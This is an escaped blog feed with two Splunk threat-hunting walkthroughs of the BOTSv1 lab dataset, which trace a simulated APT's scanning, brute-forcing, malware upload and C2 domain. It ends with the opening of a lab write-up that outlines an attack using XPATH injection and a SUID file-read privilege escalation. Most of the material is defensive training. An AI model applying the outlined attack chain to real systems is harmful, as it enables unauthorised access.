  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index=&quot;botsv1&quot; sourcetype=&quot;stream:http&quot; http_method=&quot;POST&quot; dest=&quot;192.168.250.70&quot; NOT &quot;Acunetix&quot; http_user_agent=&quot;Python*&quot; | table _time,form_data,c_ip | sort + _time&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/22.png&quot; title=&quot;botsv1/22.png&quot; alt=&quot;botsv1/22.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;It’s undoubtable that the APT performed password bruteforcing. If we are interested in checking whether the attack is successful, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;User Agent&lt;/code&gt; can tell us.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index=&quot;botsv1&quot; sourcetype=&quot;stream:http&quot; http_method=&quot;POST&quot; dest=&quot;192.168.250.70&quot; NOT &quot;Acunetix&quot; | search form_data=&quot;*user*pass*&quot; http_user_agent=&quot;Mozilla*&quot; | table _time,form_data,http_user_agent,c_ip | sort + _time&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/23.png&quot; title=&quot;botsv1/23.png&quot; alt=&quot;botsv1/23.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;It’s very likely that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;batman&lt;/code&gt; is the correct password. The search revealed that attackers used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Python&lt;/code&gt; to bruteforce password then logged in with their actual web browser.&lt;/p&gt;

&lt;p&gt;Finally, if we want to see the timeframe of the two successful logins, we can do so as belows:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index=&quot;botsv1&quot; sourcetype=&quot;stream:http&quot; http_method=&quot;POST&quot; dest=&quot;192.168.250.70&quot; NOT &quot;Acunetix&quot; | search form_data=&quot;*passwd=batman*&quot; | table _time,form_data,http_user_agent,c_ip | sort + _time&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/24.png&quot; title=&quot;botsv1/24.png&quot; alt=&quot;botsv1/24.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;The meaningful timeframe can also explain a successful bruteforce attack.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;step-5---installation-activities&quot;&gt;&lt;strong&gt;Step 5 - Installation Activities&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;As far as the exploitation is successful, we are mostly interested in the malware being transferred to the victim.&lt;/p&gt;

&lt;p&gt;To upload the malware, we want to look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST&lt;/code&gt; request with the extension of a Windows executable.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index=botsv1 NOT &quot;Acunetix&quot; sourcetype=stream:http http_method=POST dest=192.168.250.70 &quot;.exe&quot;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;part_filename{}&lt;/strong&gt; is the field we want to look at, but it’s not enabled by default. We will simply click on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;All Fields&lt;/code&gt;, then choose &lt;strong&gt;part_filename&lt;/strong&gt; to activate it.&lt;/p&gt;

&lt;p&gt;By doing so, we can efficiently extract files are uploaded to the server as the following image:&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/25.png&quot; title=&quot;botsv1/25.png&quot; alt=&quot;botsv1/25.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;The file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3791.exe&lt;/code&gt; is malicious due to the source address.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Splunk&lt;/code&gt; provides the ability to extract hashes of the uploaded files. To do that, we focus on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Sysmon&lt;/code&gt; log events:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index=botsv1 sourcetype=&quot;XmlWinEventLog:Microsoft-Windows-Sysmon/Operational&quot;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We can narrow down the search by looking at the executable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3791.exe&lt;/code&gt; and &lt;a href=&quot;https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon&quot;&gt;Event ID&lt;/a&gt; is 1.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index=botsv1 3791.exe sourcetype=&quot;XmlWinEventLog:Microsoft-Windows-Sysmon/Operational&quot; EventCode=1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/26.png&quot; title=&quot;botsv1/26.png&quot; alt=&quot;botsv1/26.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;We can make an additional step by adding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CommandLine&lt;/code&gt; to only filter the commands initiated from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3791.exe&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index=botsv1 &quot;3791.exe&quot; sourcetype=&quot;XmlWinEventLog:Microsoft-Windows-Sysmon/Operational&quot; EventCode=1 CommandLine=3791.exe&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/27.png&quot; title=&quot;botsv1/27.png&quot; alt=&quot;botsv1/27.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;In order to extract the relevant hash, we can do as follows:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index=botsv1 &quot;3791.exe&quot; sourcetype=&quot;XmlWinEventLog:Microsoft-Windows-Sysmon/Operational&quot; EventCode=1 CommandLine=3791.exe | stats values(md5)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/28.png&quot; title=&quot;botsv1/28.png&quot; alt=&quot;botsv1/28.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;We then submit the hash onto &lt;a href=&quot;www.hybrid-analysis.com&quot;&gt;www.hybrid-analysis.com&lt;/a&gt;, it’s marked as malicious.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;step-6---command-and-control-server&quot;&gt;&lt;strong&gt;Step 6 - Command and Control Server&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;In this phase, the APT will mostly interact with the victim over C2. It’s very likely that C2 will use domain to interact with the victim.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Splunk&lt;/code&gt; allows us to extract domains with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stream:dns&lt;/code&gt; sourcetype. Let’s us filter DNS traffic of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;22.23.63.114&lt;/code&gt; ip address.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index=botsv1 sourcetype=stream:dns &quot;23.22.63.114&quot; | stats values(name{})&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/29.png&quot; title=&quot;botsv1/29.png&quot; alt=&quot;botsv1/29.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;If we look a bit closer, this domain defaces our webserver.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index=botsv1 sourcetype=&quot;stream:http&quot; &quot;prankglassinebracket.jumpingcrab.com&quot;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/30.png&quot; title=&quot;botsv1/30.png&quot; alt=&quot;botsv1/30.png&quot; /&gt;
          &lt;/div&gt;</content><author><name></name></author><category term="siem" /><category term="traffic_analysis" /><category term="soc" /><category term="blue" /><summary type="html">Description The lab is provided by INE - Effectively Using Splunk (S1). Another very good &amp;amp; free lab: here.</summary></entry><entry><title type="html">Boss Of The SOC (BOTS) v1 - Threat Hunting with Splunk (I)</title><link href="https://jayngng.github.io/blog/boss-of-the-soc-bots-v1-events-analysis-with-splunk-i/" rel="alternate" type="text/html" title="Boss Of The SOC (BOTS) v1 - Threat Hunting with Splunk (I)" /><published>2023-08-22T06:30:38+10:00</published><updated>2023-08-22T06:30:38+10:00</updated><id>https://jayngng.github.io/blog/boss-of-the-soc-bots-v1---events-analysis-with-splunk-i</id><content type="html" xml:base="https://jayngng.github.io/blog/boss-of-the-soc-bots-v1-events-analysis-with-splunk-i/">&lt;h2 id=&quot;description&quot;&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;The lab is provided by INE - Effectively Using Splunk (S1).&lt;/li&gt;
  &lt;li&gt;Another very good &amp;amp; free lab: &lt;a href=&quot;https://samsclass.info/50/proj/botsv1.htm&quot;&gt;here&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In this post, we’ll proactively hunt for &lt;a href=&quot;https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html&quot;&gt;Cyber Attack Kill Chain&lt;/a&gt; from BOTsv1 dataset using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Splunk&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;step-1---reconnaissance&quot;&gt;&lt;strong&gt;Step 1 - Reconnaissance&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;Our organization’s website is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;imreallynotbatman.com&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;To begin with, we’ll test if Splunk can access the ingested data by submitting the following query:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index=&quot;botsv1&quot; earliest=0&lt;/code&gt; with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Preset: All time&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We should be able to see the events are adding on as time progesses.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/2.png&quot; title=&quot;botsv1/2.png&quot; alt=&quot;botsv1/2.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Now, let’s us identify traffic related to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;imreallynotbatman.com&lt;/code&gt; website. This can be achieved via the below query:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index=&quot;botsv1&quot; imreallynotbatman.com&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/3.png&quot; title=&quot;botsv1/3.png&quot; alt=&quot;botsv1/3.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;There are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;78,683&lt;/code&gt; events relating to this website. Currently, not all of them are essential to us, we want to narrow down those events to single stream.&lt;/p&gt;

&lt;p&gt;We can observe relevant streams as the following:&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/4.png&quot; title=&quot;botsv1/4.png&quot; alt=&quot;botsv1/4.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sourcetype&lt;/code&gt; of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stream:http&lt;/code&gt; is definitely interesting to us, the others are also valuable to check out. For now, we concentrate on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; traffic.&lt;/p&gt;

&lt;p&gt;In order to list &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; streams, we submit the below query:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index=&quot;botsv1&quot; sourcetype=&quot;stream:http&quot; imreallynotbatman.com&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/5.png&quot; title=&quot;botsv1/5.png&quot; alt=&quot;botsv1/5.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;From the outputs, events are brought down to a decent figure, Yet, it’s still too overwhelming to inspect those traffic manually.&lt;/p&gt;

&lt;p&gt;Good for us, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Splunk&lt;/code&gt; is able to sort unique IP addresses. Therefore, we can start investigating the traffic accounting for a large number of requests.&lt;/p&gt;

&lt;p&gt;The query we use here is very similar to the previous one. By adding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;... | fields src_ip&lt;/code&gt;, we can extract unique source ip address.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index=&quot;botsv1&quot; sourcetype=&quot;stream:http&quot; imreallynotbatman.com | fields src_ip&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/6.png&quot; title=&quot;botsv1/6.png&quot; alt=&quot;botsv1/6.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;The addresses - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;40.80.148.42&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;23.22.63.114&lt;/code&gt; involved in most parts of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; stream. Additionally, there is another approach we can use to count the traffic.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index=&quot;botsv1&quot; sourcetype=&quot;stream:http&quot; imreallynotbatman.com | stats count(src_ip) as &quot;Source IP&quot; by src_ip | sort + &quot;Source IP&quot;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/7.png&quot; title=&quot;botsv1/7.png&quot; alt=&quot;botsv1/7.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;So far, we can safely deduce the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;40.80.148.42&lt;/code&gt; address is dubious. Now, let’s us further dig into those traffic by specifying &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;suricata&lt;/code&gt; sourcetype.&lt;/p&gt;

&lt;p&gt;The following query will give us a bird’s eye view of all &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;suricata&lt;/code&gt; alerts against this address:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index=&quot;botsv1&quot; sourcetype=&quot;suricata&quot; src=&quot;40.80.148.42&quot; | search event_type=alert | stats count(alert.signature) as &quot;Alert&quot; by alert.signature | sort - &quot;Alert&quot;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/8.png&quot; title=&quot;botsv1/8.png&quot; alt=&quot;botsv1/8.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;As we can see, multiple attacks are mounted by the APT group. Let’s look at one of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; request being sent by this adversary. The search is as below:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index=&quot;botsv1&quot; sourcetype=&quot;stream:http&quot; src=&quot;40.80.148.42&quot;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;After the query is submitted, we scroll down a little. There is an interesting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; header indicating the existence of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Acunetix&lt;/code&gt; vulnerability scanner being used.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/9.png&quot; title=&quot;botsv1/9.png&quot; alt=&quot;botsv1/9.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;If we are interested in victim IP addresses, we can do so by looking up the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dest&lt;/code&gt; field. This field reveals us which IP address is targerted by the scanner.&lt;/p&gt;

&lt;p&gt;SPL query to use is same as the previous one.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/10.png&quot; title=&quot;botsv1/10.png&quot; alt=&quot;botsv1/10.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;There are two IP addresses: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.250.70&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.250.40&lt;/code&gt;. Obviously, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.250.70&lt;/code&gt; is the primary target, which is also the organization’s website.&lt;/p&gt;

&lt;p&gt;If we want to look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP URI&lt;/code&gt; being scanned by this APT group, we can filter the status of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http&lt;/code&gt; stream:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index=&quot;botsv1&quot; sourcetype=&quot;stream:http&quot; status=200 src=&quot;40.80.148.42&quot; dest=&quot;192.168.250.70&quot; | stats count by uri | sort - count&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/11.png&quot; title=&quot;botsv1/11.png&quot; alt=&quot;botsv1/11.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Others, we can further inspect the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iis&lt;/code&gt; stream for more information:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index=&quot;botsv1&quot; sourcetype=&quot;iis&quot;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/12.png&quot; title=&quot;botsv1/12.png&quot; alt=&quot;botsv1/12.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;At this point, we can conclude that the APT group employed &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Acunetix&lt;/code&gt; vulnerability scanner to perform reconnaissance activities against the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Joomla&lt;/code&gt; website hosted on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.250.70&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;step-2---weaponization&quot;&gt;&lt;strong&gt;Step 2 - Weaponization&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;In this phase, we’ll start investigating target’s infrastructure and all relevant information related to this APT.&lt;/p&gt;

&lt;p&gt;Bearing with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Splunk&lt;/code&gt;, we’re able to derive a relatively good amount of information from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;40.80.148.42&lt;/code&gt;. Yet, applying same tatiics against the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;23.22.63.114&lt;/code&gt; address doesn’t yield us a lot of interesting information.&lt;/p&gt;

&lt;p&gt;Now, if we go to the open source such as &lt;a href=&quot;https://www.robtex.com/&quot;&gt;robtex&lt;/a&gt;, or &lt;a href=&quot;https://www.threatcrowd.org/&quot;&gt;threatcrowd&lt;/a&gt; and submit this ip address …&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/13.png&quot; title=&quot;botsv1/13.png&quot; alt=&quot;botsv1/13.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;we can see that this IP address returns some phising domains, which are similar to &lt;strong&gt;Wayne Enterprise&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Besides, employing open source like &lt;strong&gt;ThreatCrowd&lt;/strong&gt; also reveals us a good deal of information.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/14.png&quot; title=&quot;botsv1/14.png&quot; alt=&quot;botsv1/14.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Furthermore, if we perform &lt;strong&gt;DNS lookup&lt;/strong&gt; against one of the above phising domains, we’ll come across more valuable information i.e. &lt;strong&gt;Email&lt;/strong&gt; or &lt;strong&gt;NS&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/15.png&quot; title=&quot;botsv1/15.png&quot; alt=&quot;botsv1/15.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;With the email, we can potentially divulge other infrastructure associated with the APT group.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/16.png&quot; title=&quot;botsv1/16.png&quot; alt=&quot;botsv1/16.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;step-3---delivery-activities&quot;&gt;&lt;strong&gt;Step 3 - Delivery Activities&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;In this phase, we want to gather more information, potential malware used by the attackers …&lt;/p&gt;

&lt;p&gt;Website such as &lt;a href=&quot;https://www.threatminer.org&quot;&gt;ThreatMiner&lt;/a&gt; gives us precious information relating to &lt;strong&gt;TTPs&lt;/strong&gt; used by the APT.&lt;/p&gt;

&lt;p&gt;Submitting the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;23.22.63.114&lt;/code&gt; address to &lt;strong&gt;www.threatminer.org&lt;/strong&gt; returns a few sample malwares being used by the adversaries …&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/17.png&quot; title=&quot;botsv1/17.png&quot; alt=&quot;botsv1/17.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Again, if we submit MD5 hashes to open sources as &lt;strong&gt;VirusTotal&lt;/strong&gt; or &lt;a href=&quot;https://hybrid-analysis.com/sample/ec78c938d8453739ca2a370b9c275971ec46caf6e479de2b2d04e97cc47fa45d?environmentId=100&quot;&gt;Hybrid Analysis&lt;/a&gt;, we can retrieve metadata about those samples, which is useful in the future investigation.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/botsv1/18.png&quot; title=&quot;botsv1/18.png&quot; alt=&quot;botsv1/18.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Next post&lt;/strong&gt;: we’ll examine &lt;strong&gt;Exploitation&lt;/strong&gt;, &lt;strong&gt;Installation&lt;/strong&gt;, and &lt;strong&gt;C2&lt;/strong&gt; phases used by the APT.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;</content><author><name></name></author><category term="siem" /><category term="traffic_analysis" /><category term="soc" /><category term="blue" /><summary type="html">Description The lab is provided by INE - Effectively Using Splunk (S1). Another very good &amp;amp; free lab: here.</summary></entry><entry><title type="html">Wheels - OSPG</title><link href="https://jayngng.github.io/blog/wheels-ospg/" rel="alternate" type="text/html" title="Wheels - OSPG" /><published>2023-08-17T06:46:46+10:00</published><updated>2023-08-17T06:46:46+10:00</updated><id>https://jayngng.github.io/blog/wheels---ospg</id><content type="html" xml:base="https://jayngng.github.io/blog/wheels-ospg/">&lt;h1 id=&quot;summary&quot;&gt;Summary&lt;/h1&gt;
&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;registration&lt;/code&gt; mechanism of the website allowed the tester to sign up as a company employee. Landing on the employee portal, the tester discovered a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XPATH&lt;/code&gt; injection vulnerability in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;search&lt;/code&gt; tool. Successful exploitation of this weakness will infiltrate sensitive information of numerous users. Amongst them, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bob&lt;/code&gt;’s account granted the tester access into the system via the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt; service. Privilege escalation is done by exploiting a custom &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SUID&lt;/code&gt; binary, named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get-list&lt;/code&gt;, letting one to arbitrarily read any system files.&lt;/p&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h1&gt;
&lt;h2 id=&quot;nmap&quot;&gt;&lt;strong&gt;Nmap&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;The tester scanned target system using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; evidences/scans/nmap/basic_scan.md &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; 192.168.167.202
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...SNIP...]
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
| http-methods: 
